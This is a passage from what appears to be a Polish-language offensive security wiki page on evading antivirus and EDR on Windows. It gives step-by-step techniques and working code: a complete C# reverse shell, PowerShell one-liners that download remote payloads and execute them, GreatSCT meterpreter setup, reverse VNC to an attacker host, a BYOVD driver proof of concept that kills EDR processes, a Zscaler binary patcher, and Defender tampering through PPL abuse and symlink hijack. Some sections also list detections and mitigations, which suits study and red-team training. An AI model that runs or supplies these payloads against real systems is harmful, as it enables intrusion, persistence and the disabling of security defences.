- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące EXE/DLL na shellcode i następnie je załadować

## SmartScreen & MoTW

Możesz widzieć ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i uruchamiania ich.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający na celu ochronę użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o podejście oparte na reputacji, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, ostrzegając i uniemożliwiając użytkownikowi końcowemu wykonanie pliku (choć plik nadal można uruchomić klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony przy pobieraniu plików z internetu, wraz z adresem URL, z którego został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Ważne jest, aby pamiętać, że pliki wykonywalne podpisane za pomocą **zaufanego** certyfikatu podpisu **nie spowodują uruchomienia SmartScreen**.

Bardzo skutecznym sposobem zapobiegania otrzymaniu przez payloads Mark of The Web jest spakowanie ich w jakiś kontener, np. ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **cannot** być zastosowany do woluminów **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloads do kontenerów wyjściowych, aby ominąć Mark-of-the-Web.

Przykładowe użycie:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i składnikom systemowym na **rejestrowanie zdarzeń**. Jednak może być też wykorzystywany przez produkty zabezpieczające do monitorowania i wykrywania złośliwych działań.

Podobnie jak w przypadku wyłączania (obejścia) AMSI, możliwe jest również sprawienie, by funkcja **`EtwEventWrite`** procesu przestrzeni użytkownika natychmiast zwracała, nie rejestrując żadnych zdarzeń. Osiąga się to przez załatanie funkcji w pamięci tak, aby natychmiast zwracała, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binarek C# do pamięci jest znane od dawna i wciąż jest świetnym sposobem uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci bez dotykania dysku, musimy się martwić jedynie o patchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, itp.) już umożliwia wykonywanie C# assemblies bezpośrednio w pamięci, ale istnieją różne sposoby realizacji tego:

- **Fork\&Run**

Polega na **utworzeniu nowego procesu poświęconego**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu go, a po zakończeniu zabiciu tego procesu. Ma to swoje zalety i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** procesem naszego implantatu Beacon. Oznacza to, że jeśli coś pójdzie nie tak podczas działania post-exploitation lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa.** Wadą jest **większe prawdopodobieństwo** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonania payloadu, istnieje **znacznie większe ryzyko** **utraty Beacona**, ponieważ proces może się zawiesić lub paść.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz przeczytać więcej o ładowaniu C# Assembly, sprawdź ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować C# Assemblies **z PowerShell** — zobacz [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [wideo S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Używanie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu w innych językach, dając skompromitowanej maszynie dostęp **do środowiska interpretera zainstalowanego na Attacker Controlled SMB share**.

Pozwalając na dostęp do Interpreter Binaries i środowiska na udziale SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.

Repo wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itp. mamy **więcej elastyczności, by obejść statyczne sygnatury**. Testy z losowymi nieobfuskowanymi skryptami reverse shell w tych językach okazały się skuteczne.

## TokenStomping

Token stomping to technika pozwalająca atakującemu **manipulować tokenem dostępu lub produktem zabezpieczającym jak EDR czy AV**, umożliwiając obniżenie jego uprawnień tak, że proces nie zginie, ale nie będzie miał uprawnień do sprawdzania złośliwych działań.

Aby temu zapobiec, Windows mógłby **uniemożliwić zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczeń.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest zainstalować Chrome Remote Desktop na maszynie ofiary, a następnie użyć go do przejęcia i utrzymania dostępu:
1. Pobierz ze https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie kliknij plik MSI dla Windows, aby pobrać MSI.
2. Uruchom instalator w trybie cichym na maszynie ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij dalej. Kreator poprosi o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr z odpowiednimi poprawkami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Uwaga na parametr pin, który pozwala ustawić PIN bez użycia GUI).

## Advanced Evasion

Evasion to bardzo skomplikowany temat — czasem trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, przeciwko któremu działasz, będzie miało swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby uzyskać wgląd w bardziej zaawansowane techniki Evasion.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare techniki**

### **Sprawdź, które części Defender oznacza jako złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać części binarki**, aż **wykaże, którą część Defender** uznaje za złośliwą i rozdzieli ją dla ciebie.\
Inne narzędzie robiące to **samo** to [**avred**](https://github.com/dobin/avred) z otwartą usługą webową dostępną pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10 włącznie wszystkie wersje Windows miały dostępny **Telnet server**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ustaw, aby się **uruchamiał** przy starcie systemu i **uruchom** go teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnetu** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (pobierz wersję binarną, nie instalator)

**NA KOMPUTERZE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na komputer **ofiary**

#### **Połączenie odwrotne**

**Atakujący** powinien **uruchomić na swoim hoście** binarkę `vncviewer.exe -listen 5900`, aby był **przygotowany** na przechwycenie odwrotnego połączenia **VNC**. Następnie, na komputerze **ofiary**: uruchom demona winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować dyskrecję, nie możesz robić następujących rzeczy

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** poleceniem `msfconsole -r file.rc` i **wykonaj** **xml payload** poleceniem:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny defender bardzo szybko zakończy proces.**

### Kompilowanie naszego własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# z użyciem kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i wykonanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Używanie python do build injectors — przykład:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć ochronę endpoint przed zrzuceniem ransomware. Narzędzie dostarcza swój **own vulnerable but *signed* driver** i wykorzystuje go do wydawania uprzywilejowanych operacji w kernelu, których nie mogą zablokować nawet Protected-Process-Light (PPL) AV services.

Kluczowe wnioski
1. **Podpisany sterownik**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binarka to legalnie podpisany sterownik `AToolsKrnl64.sys` z narzędzi Antiy Labs “System In-Depth Analysis Toolkit”. Ponieważ sterownik ma ważny podpis Microsoft, ładuje się nawet gdy Driver-Signature-Enforcement (DSE) jest włączone.
2. **Instalacja usługi**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako **kernel service**, a druga go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTLs udostępnione przez sterownik**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończenie dowolnego procesu po PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usunięcie dowolnego pliku na dysku |
| `0x990001D0` | Odładowanie sterownika i usunięcie usługi |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Dlaczego to działa**: BYOVD całkowicie omija ochrony w trybie użytkownika; kod wykonujący się w kernelu może otwierać *protected* processes, kończyć je lub modyfikować obiekty jądra niezależnie od PPL/PP, ELAM czy innych mechanizmów hardeningu.

Wykrywanie / Łagodzenie
•  Włącz listę blokowanych podatnych sterowników Microsoft (`HVCI`, `Smart App Control`), aby Windows odrzucał ładowanie `AToolsKrnl64.sys`.  
•  Monitoruj tworzenie nowych usług kernelowych i generuj alert, gdy sterownik jest ładowany z katalogu zapisywalnego przez wszystkich lub nie znajduje się na allow-list.  
•  Obserwuj uchwyty w trybie użytkownika do niestandardowych obiektów device oraz podejrzane wywołania `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** wykonuje reguły device-posture lokalnie i polega na Windows RPC do komunikacji wyników z innymi komponentami. Dwa słabe wybory projektowe umożliwiają pełne obejście:

1. Ocena postawy odbywa się **całkowicie po stronie klienta** (na serwer wysyłany jest tylko boolean).  
2. Wewnętrzne endpointy RPC jedynie weryfikują, że łączący się plik wykonywalny jest **signed by Zscaler** (przez `WinVerifyTrust`).

Poprzez **spatchowanie czterech podpisanych binarek na dysku** oba mechanizmy można zneutralizować:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola jest zgodna |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ dowolny (nawet unsigned) proces może związać się z pipe'ami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Omijane / krótkie spięcie (short-circuited) |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Wszystkie** posture checks display **green/compliant**.
* Niesygnowane lub zmodyfikowane binaria mogą otwierać named-pipe RPC endpoints (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Zainfekowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

Ten studium przypadku pokazuje, jak decyzje zaufania realizowane wyłącznie po stronie klienta oraz proste sprawdzenia podpisu można obejść za pomocą kilku poprawek bajtowych.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) narzuca hierarchię signer/level, tak że tylko chronione procesy o równym lub wyższym poziomie mogą ingerować w siebie nawzajem. Z ofensywnego punktu widzenia, jeśli możesz legalnie uruchomić binarkę z obsługą PPL i kontrolować jej argumenty, możesz przekształcić benignną funkcjonalność (np. logging) w ograniczony, wspierany przez PPL prymityw zapisu do chronionych katalogów używanych przez AV/EDR.

What makes a process run as PPL
- Docelowy EXE (i wszelkie załadowane DLLs) musi być signed z użyciem PPL-capable EKU.
- Proces musi być utworzony przy użyciu CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać kompatybilnego protection level, który odpowiada signerowi binarki (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla anti-malware signerów, `PROTECTION_LEVEL_WINDOWS` dla Windows signerów). Nieprawidłowe poziomy spowodują niepowodzenie przy tworzeniu.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Narzędzie open-source: CreateProcessAsPPL (wybiera protection level i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` samodzielnie uruchamia proces i akceptuje parametr do zapisania pliku dziennika w ścieżce wskazanej przez wywołującego.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyprowadź krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom PPL-capable LOLBIN (ClipUp) z `CREATE_PROTECTED_PROCESS` używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). Użyj krótkich nazw 8.3 jeśli potrzeba.
3) Jeśli docelowy binarny plik jest zwykle otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis przy starcie systemu przed uruchomieniem AV instalując usługę autostartu, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność startu za pomocą Process Monitor (boot logging).
4) Po restarcie zapis z obsługą PPL następuje zanim AV zablokuje swoje binaria, uszkadzając docelowy plik i uniemożliwiając uruchomienie.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Nie możesz kontrolować zawartości, którą zapisuje ClipUp poza miejscem zapisu; mechanizm nadaje się bardziej do korupcji niż precyzyjnego wstrzykiwania zawartości.
- Wymaga lokalnego Administratora/SYSTEM do instalacji/uruchomienia usługi oraz okna na reboot.
- Czasowanie jest krytyczne: cel nie może być otwarty; wykonanie podczas rozruchu unika blokad plików.

Detections
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie jeśli rodzicem są niestandardowe programy uruchamiające, w okolicy rozruchu.
- Nowe usługi skonfigurowane do auto-startu podejrzanych binariów i konsekwentnie uruchamiające się przed Defender/AV. Zbadaj tworzenie/modyfikację usług przed wystąpieniem błędów startu Defender.
- Monitorowanie integralności plików dla binariów Defender/katalogów Platform; nieoczekiwane tworzenie/modyfikacje plików przez procesy z flagami protected-process.
- ETW/EDR telemetry: szukaj procesów utworzonych z użyciem `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomu PPL przez binaria nie będące AV.

Mitigations
- WDAC/Code Integrity: ogranicz, które podpisane binaria mogą działać jako PPL i pod jakimi rodzicami; blokuj wywołania ClipUp poza legalnymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług auto-start i monitoruj manipulacje kolejnością uruchamiania.
- Upewnij się, że Tamper Protection i mechanizmy wczesnego uruchamiania Defender są włączone; zbadaj błędy startu wskazujące na korupcję binariów.
- Rozważ wyłączenie generowania nazw 8.3 na woluminach zawierających narzędzia zabezpieczające, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wybiera platformę, z której się uruchamia, enumerując podfoldery w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z leksykograficznie najwyższym ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia z niego procesy usługi Defender (aktualizując odpowiednio ścieżki usługi/rejestru). Ten wybór ufa wpisom katalogu, w tym punktom ponownego parsowania katalogu (symlinks). Administrator może to wykorzystać do przekierowania Defender na ścieżkę zapisywalną przez atakującego i osiągnięcia DLL sideloading lub zakłócenia działania usługi.

Preconditions
- Lokalny Administrator (potrzebny do tworzenia katalogów/dowiązań symbolicznych pod folderem Platform)
- Możliwość rebootu lub wymuszenia ponownego wyboru platformy Defender (restart usługi przy rozruchu)
- Wymagane tylko wbudowane narzędzia (mklink)

Why it works
- Defender blokuje zapisy w swoich własnych folderach, ale wybór platformy ufa wpisom katalogu i wybiera leksykograficznie najwyższą wersję bez weryfikacji, czy cel rozwiązuje się do chronionej/zaufanej ścieżki.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz symlink katalogu o wyższej wersji wewnątrz Platform wskazujący na swój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór triggera (zalecane ponowne uruchomienie):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, czy MsMpEng.exe (WinDefend) uruchamia się z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinieneś zaobserwować nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestru odzwierciedlającą tę lokalizację.

Post-exploitation options
